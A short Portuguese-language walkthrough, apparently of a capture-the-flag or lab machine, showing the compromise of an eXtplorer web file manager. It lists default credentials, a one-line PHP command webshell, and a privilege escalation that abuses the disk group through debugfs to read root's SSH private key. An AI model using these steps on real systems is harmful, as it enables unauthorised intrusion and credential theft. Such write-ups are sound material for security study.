# Extplorer
> eXtplorer file manager + grupo disk

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

eXtplorer (gerenciador de arquivos web) identificado.

## Exploração

Credenciais padrão ou fracas no eXtplorer:

```
admin:admin
admin:extplorer
```

File manager com upload permitido → webshell enviada.

```
# shell.php
<?php system($_GET['cmd']); ?>
```

Reverse shell como www-data.

## Escalada de Privilégio

Usuário pertence ao grupo `disk`:

```
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data),6(disk)
```

Leitura direta do disco como root:

```
df -h
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
```

```
# salvar chave e conectar
chmod 600 id_rsa
ssh -i id_rsa root@<IP>
```

Root obtido.
